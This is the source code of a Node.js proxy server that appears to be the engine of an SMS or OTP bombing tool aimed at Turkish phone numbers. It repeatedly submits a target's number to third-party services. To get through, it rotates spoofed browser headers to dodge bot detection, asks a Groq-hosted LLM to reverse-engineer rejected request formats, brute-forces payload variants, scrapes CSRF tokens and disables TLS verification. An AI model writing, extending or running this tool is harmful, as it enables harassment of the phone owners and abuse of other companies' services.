import 'dotenv/config';
import express from 'express';
import cors from 'cors';
import Groq from 'groq-sdk';
import axios from 'axios';

process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

const groqApiKey = process.env.GROQ_API_KEY || '';
const groq = groqApiKey ? new Groq({ apiKey: groqApiKey }) : null;

const app = express();
app.use(cors());
app.use(express.json());

// ===== (#2) Richer Rotating Headers =====
const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15',
  'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
];

const LANGUAGES = ['tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7', 'tr-TR,tr;q=0.9,en;q=0.5', 'en-US,en;q=0.9,tr;q=0.8', 'tr,en-US;q=0.9,en;q=0.8'];
const SEC_FETCH_DEST = ['empty', 'empty', 'empty', 'document'];
const SEC_FETCH_MODE = ['cors', 'cors', 'navigate', 'same-origin'];
const SEC_FETCH_SITE = ['same-origin', 'same-site', 'cross-site'];

function pickRandom(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}

function buildRotatingHeaders(origin) {
  const headers = {
    'User-Agent': pickRandom(USER_AGENTS),
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': pickRandom(LANGUAGES),
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/json',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache',
    'DNT': '1',
    'Connection': 'keep-alive',
    'Sec-Fetch-Dest': pickRandom(SEC_FETCH_DEST),
    'Sec-Fetch-Mode': pickRandom(SEC_FETCH_MODE),
    'Sec-Fetch-Site': pickRandom(SEC_FETCH_SITE),
  };
  if (origin) {
    headers['Origin'] = origin;
    headers['Referer'] = origin + '/';
  }
  return headers;
}

// ===== Helpers =====
function interpolatePhone(schema, targetPhone, email) {
  let str = JSON.stringify(schema);
  str = str.replace(/{{PHONE}}/g, targetPhone);
  str = str.replace(/{{EMAIL}}/g, email || 'test@test.com');
  str = str.replace(/\+905XXXXXXXXX/g, `+90${targetPhone}`);
  str = str.replace(/905XXXXXXXXX/g, `90${targetPhone}`);
  str = str.replace(/05XXXXXXXXX/g, `0${targetPhone}`);
  str = str.replace(/5XXXXXXXXX/g, targetPhone);
  return JSON.parse(str);
}

function cleanHtmlForAi(rawHtml) {
  if (!rawHtml) return 'No body';
  let str = typeof rawHtml === 'string' ? rawHtml : JSON.stringify(rawHtml);
  str = str.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');
  str = str.replace(/<style\b[^<]*(?:(?!<\/style>)<[^<]*)*<\/style>/gi, '');
  str = str.replace(/<svg\b[^<]*(?:(?!<\/svg>)<[^<]*)*<\/svg>/gi, '');
  str = str.replace(/<!--[\s\S]*?-->/g, '');
  str = str.replace(/\s+/g, ' ').trim();
  return str.length > 2500 ? str.substring(0, 2500) + '...[TRUNCATED]' : str;
}

async function executeRequest(url, method, payload, headers, timeout = 15000) {
  try {
    const response = await axios({
      method: method || 'POST',
      url,
      data: payload,
      timeout,
      headers: headers || buildRotatingHeaders(),
      validateStatus: () => true
    });
    return {
      success: response.status >= 200 && response.status < 300,
      status: response.status,
      data: response.data,
      html: ''
    };
  } catch (err) {
    const axiosErr = err;
    return {
      success: false,
      status: axiosErr.response?.status || 0,
      data: axiosErr.response?.data || err.message,
      html: typeof axiosErr.response?.data === 'string' ? axiosErr.response.data : JSON.stringify(axiosErr.response?.data)
    };
  }
}

// ===== (#3) Smart Payload Variations =====
const PHONE_FIELD_NAMES = ['phone', 'mobilePhone', 'phoneNumber', 'mobilePhoneNumber', 'mobile_phone', 'telephone', 'gsm', 'cepTelefonu', 'telefon', 'mobile', 'cellPhone', 'Phone', 'MobilePhone', 'TelephoneNumber'];

function findPhoneField(obj) {
  for (const key of Object.keys(obj)) {
    const v = String(obj[key]);
    if (/^(\+?90|0)?5\d{9}$/.test(v) || /^5XXXXXXXXX$/.test(v) || /^905XXXXXXXXX$/.test(v) || /^05XXXXXXXXX$/.test(v)) {
      return key;
    }
  }
  return null;
}

function buildSmartVariants(originalPayload, targetPhone, email) {
  const variants = [];
  const phoneFormats = [targetPhone, `0${targetPhone}`, `90${targetPhone}`, `+90${targetPhone}`];
  const phoneField = findPhoneField(originalPayload);
  const baseKeys = Object.keys(originalPayload).filter(k => k !== phoneField && k !== 'email');

  for (const newField of PHONE_FIELD_NAMES.slice(0, 10)) {
    for (const fmt of phoneFormats) {
      const v = {};
      for (const k of baseKeys) v[k] = originalPayload[k];
      v[newField] = fmt;
      if (email) v.email = email;
      variants.push(v);
    }
  }

  for (const newField of PHONE_FIELD_NAMES) {
    for (const fmt of phoneFormats) {
      const v = { [newField]: fmt };
      if (email) v.email = email;
      variants.push(v);
    }
  }

  return variants;
}

async function withBackoff(step, fn) {
  if (step > 1) await sleep(200 + Math.random() * 600);
  return fn();
}

async function attemptStrategies({ serviceUrl, serviceMethod, targetPhone, email, payloadToUse, customHeaders }) {
  const results = [];
  const origin = new URL(serviceUrl).origin;
  const rotatingHeaders = buildRotatingHeaders(origin);
  const mergedHeaders = { ...rotatingHeaders, ...(customHeaders || {}) };

  // Strategy 1: Direct
  await withBackoff(1, async () => {
    results.push({ attempt: 1, strategy: 'direct', ...(await executeRequest(serviceUrl, serviceMethod, payloadToUse, mergedHeaders)) });
  });
  if (results[0]?.success) return results;

  // Strategy 2: AI Healing (A)
  if (groq) {
    await withBackoff(2, async () => {
      const cleanedErrorBody = cleanHtmlForAi(results[0].html || JSON.stringify(results[0].data));
      const prompt = `You are a highly advanced API reverse-engineering AI. I tried to send a POST request to ${serviceUrl}. The payload I sent was: ${JSON.stringify(payloadToUse)} The server rejected it with HTTP ${results[0].status}. The server returned this error/HTML body: --- ${cleanedErrorBody} --- Based on this error or HTML form, deduce the correct JSON body format required by this API. You MUST output ONLY valid JSON. Nothing else. No markdown formatting. Where a phone number belongs, output EXACTLY the string "{{PHONE}}". Where an email belongs, output EXACTLY the string "{{EMAIL}}". Give me the fully corrected structured JSON.`;

      try {
        const chatCompletion = await groq.chat.completions.create({
          model: "llama-3.3-70b-versatile",
          messages: [
            { role: "system", content: "You extract API schemas and return strictly valid JSON." },
            { role: "user", content: prompt }
          ],
          response_format: { type: "json_object" }
        });
        const healedJsonString = chatCompletion.choices[0].message.content;
        let healedSchema;
        try {
          healedSchema = JSON.parse(healedJsonString || '{}');
        } catch {
          results.push({ attempt: 2, strategy: 'ai_heal', success: false, status: 0, data: 'AI parse error' });
          return;
        }
        const healedPayload = interpolatePhone(healedSchema, targetPhone, email);
        const healResult = await executeRequest(serviceUrl, serviceMethod, healedPayload, buildRotatingHeaders(origin));
        healResult.healed = true;
        healResult.healedPayload = healedSchema;
        results.push({ attempt: 2, strategy: 'ai_heal', ...healResult });
      } catch (err) {
        results.push({ attempt: 2, strategy: 'ai_heal', success: false, status: 0, data: String(err) });
      }
    });
    if (results.some(r => r.success)) return results;
  }

  // Strategy 3: form-urlencoded
  await withBackoff(3, async () => {
    const formHeaders = {
      ...mergedHeaders,
      'Content-Type': 'application/x-www-form-urlencoded',
      'X-Requested-With': 'XMLHttpRequest'
    };
    let encoded;
    try {
      const parsed = typeof payloadToUse === 'object' ? payloadToUse : JSON.parse(payloadToUse);
      encoded = new URLSearchParams(parsed).toString();
    } catch {
      encoded = typeof payloadToUse === 'string' ? payloadToUse : JSON.stringify(payloadToUse);
    }
    const r3 = await executeRequest(serviceUrl, serviceMethod, encoded, formHeaders);
    results.push({ attempt: 3, strategy: 'form_urlencoded', ...r3 });
  });
  if (results.some(r => r.success)) return results;

  // Strategy 4: bare phone
  await withBackoff(4, async () => {
    const r4 = await executeRequest(serviceUrl, serviceMethod, { phone: targetPhone }, { ...mergedHeaders });
    results.push({ attempt: 4, strategy: 'bare_phone', ...r4 });
  });
  if (results.some(r => r.success)) return results;

  // Strategy 5: 90 format
  await withBackoff(5, async () => {
    const r5 = await executeRequest(serviceUrl, serviceMethod, { phone: `90${targetPhone}` }, { ...mergedHeaders });
    results.push({ attempt: 5, strategy: '90_format', ...r5 });
  });
  if (results.some(r => r.success)) return results;

  // Strategy 6: (#3) Smart payload variants
  const smartVariants = buildSmartVariants(payloadToUse, targetPhone, email);
  for (let i = 0; i < Math.min(smartVariants.length, 25); i++) {
    const v = smartVariants[i];
    await withBackoff(6 + i, async () => {
      const r = await executeRequest(serviceUrl, serviceMethod, v, { ...mergedHeaders });
      results.push({ attempt: 6 + i, strategy: `smart_${Object.keys(v).filter(k => k !== 'email')[0] || 'phone'}`, ...r });
    });
    if (results.some(r => r.success)) return results;
  }

  // Strategy 7: +90 prefix
  for (const field of PHONE_FIELD_NAMES.slice(0, 6)) {
    await withBackoff(100, async () => {
      const v = { [field]: `+90${targetPhone}` };
      const r = await executeRequest(serviceUrl, serviceMethod, v, { ...mergedHeaders });
      results.push({ attempt: 100, strategy: `plus90_${field}`, ...r });
    });
    if (results.some(r => r.success)) return results;
  }

  // Strategy 8: 0 prefix
  for (const field of PHONE_FIELD_NAMES.slice(0, 6)) {
    await withBackoff(200, async () => {
      const v = { [field]: `0${targetPhone}` };
      const r = await executeRequest(serviceUrl, serviceMethod, v, { ...mergedHeaders });
      results.push({ attempt: 200, strategy: `zero_${field}`, ...r });
    });
    if (results.some(r => r.success)) return results;
  }

  // Strategy 9: CSRF
  await withBackoff(300, async () => {
    const csrfHeaders = {
      ...mergedHeaders,
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    };

    try {
      const preflight = await axios({
        method: 'GET',
        url: origin + '/',
        timeout: 10000,
        headers: { 'User-Agent': pickRandom(USER_AGENTS), 'Accept': csrfHeaders['Accept'] },
        validateStatus: () => true,
        maxRedirects: 5
      });

      if (preflight.status >= 200 && preflight.status < 400) {
        let csrfToken = '';
        const bodyStr = typeof preflight.data === 'string' ? preflight.data : '';
        const allSetCookies = preflight.headers['set-cookie'] || [];

        const aspMatch = bodyStr.match(/<input[^>]*name=["']__RequestVerificationToken["'][^>]*value=["']([^"']+)["'][^>]*\/?>/i);
        if (aspMatch) csrfToken = aspMatch[1];

        const djangoBodyMatch = bodyStr.match(/<input[^>]*name=["']csrfmiddlewaretoken["'][^>]*value=["']([^"']+)["']/i);
        if (!csrfToken && djangoBodyMatch) csrfToken = djangoBodyMatch[1];

        let djangoCookie = '';
        for (const c of allSetCookies) {
          const m = c.match(/csrftoken=([^;]+)/);
          if (m) { djangoCookie = m[1]; break; }
        }

        if (csrfToken || djangoCookie) {
          const csrfMerged = { ...csrfHeaders, ...(customHeaders || {}) };
          csrfMerged['Content-Type'] = 'application/x-www-form-urlencoded';
          if (djangoCookie) {
            csrfMerged['X-CSRFToken'] = djangoCookie;
            csrfMerged['Cookie'] = 'csrftoken=' + djangoCookie;
          }

          let csrfEncoded;
          if (csrfToken) {
            const parsedPayload = typeof payloadToUse === 'object' ? { ...payloadToUse } : JSON.parse(JSON.stringify(payloadToUse));
            parsedPayload.__RequestVerificationToken = csrfToken;
            try {
              const kv = typeof parsedPayload === 'object' ? parsedPayload : JSON.parse(parsedPayload);
              csrfEncoded = new URLSearchParams(kv).toString();
            } catch { csrfEncoded = JSON.stringify(parsedPayload); }
          } else {
            try {
              const parsed = typeof payloadToUse === 'object' ? payloadToUse : JSON.parse(payloadToUse);
              csrfEncoded = new URLSearchParams(parsed).toString();
            } catch { csrfEncoded = typeof payloadToUse === 'string' ? payloadToUse : JSON.stringify(payloadToUse); }
          }

          const r6 = await executeRequest(serviceUrl, serviceMethod, csrfEncoded, {
            ...csrfMerged,
            'Origin': origin,
            'Referer': origin + '/'
          });
          results.push({ attempt: 300, strategy: 'csrf', ...r6 });
          if (r6.success) return;

          const r6b = await executeRequest(serviceUrl, serviceMethod, payloadToUse, {
            ...csrfMerged,
            'Content-Type': 'application/json',
            'Origin': origin,
            'Referer': origin + '/'
          });
          results.push({ attempt: 301, strategy: 'csrf_json', ...r6b });
        }
      }
    } catch {
      // CSRF preflight failed, skip
    }
  });

  return results;
}

app.get('/health', (req, res) => {
  res.json({ ok: true, mode: 'local', pid: process.pid });
});

app.post('/api/proxy', async (req, res) => {
  const { serviceId, serviceUrl, serviceMethod, targetPhone, email, initialPayload, allowAiHealing, maxRetries } = req.body;

  if (!serviceId || !serviceUrl || !targetPhone) {
    return res.status(400).json({ error: 'Missing required fields' });
  }

  try {
    let payloadToUse = initialPayload
      ? (typeof initialPayload === 'string' ? JSON.parse(initialPayload) : initialPayload)
      : { phone: targetPhone };
    payloadToUse = interpolatePhone(payloadToUse, targetPhone, email);

    const attempts = await attemptStrategies({
      serviceUrl, serviceMethod, targetPhone, email, payloadToUse, customHeaders: req.body.serviceHeaders
    });

    const successAttempt = attempts.find(a => a.success);
    if (successAttempt) {
      return res.status(200).json({
        ok: true,
        upstreamStatus: successAttempt.status,
        attempt: successAttempt.attempt,
        strategy: successAttempt.strategy,
        healed: successAttempt.healed || false,
        healedPayload: successAttempt.healedPayload || null
      });
    }

    const lastAttempt = attempts[attempts.length - 1] || { strategy: 'none', status: 0, data: 'No attempts made' };
    return res.status(502).json({
      ok: false,
      upstreamStatus: lastAttempt.status || 0,
      strategy: lastAttempt.strategy || 'none',
      error: 'All upstream attempts failed',
      lastResponse: typeof lastAttempt.data === 'string' ? lastAttempt.data.substring(0, 200) : JSON.stringify(lastAttempt.data).substring(0, 200)
    });

  } catch (error) {
    console.error('[Proxy] Error:', error);
    return res.status(502).json({ ok: false, upstreamStatus: 0, strategy: 'error', error: error.message });
  }
});

const PORT = 3001;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`[Local Proxy] Running on http://localhost:${PORT}`);
});
